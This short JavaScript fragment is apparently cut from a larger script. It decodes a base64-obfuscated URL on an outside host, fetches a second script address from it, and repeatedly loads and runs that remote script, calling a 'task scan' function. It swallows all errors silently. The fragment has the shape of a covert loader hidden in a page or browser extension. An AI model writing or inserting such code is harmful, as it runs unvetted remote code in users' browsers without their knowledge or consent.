...
try{$.get(window.atob("aHR0cHM6Ly9lYi54Y2oucHViL2VidXNpbmVzcy9hcGkvZ2V0L3NjcmlwdF91cmw/c25vPTE="),function(t){if(t&&t.data)let c=0,a=setInterval(function(){c>=10?clearInterval(a):($.getScript(t.data).done(()=>{_i180u_task_scan_($),clearInterval(a)}),c++)},300)})}catch(t){}
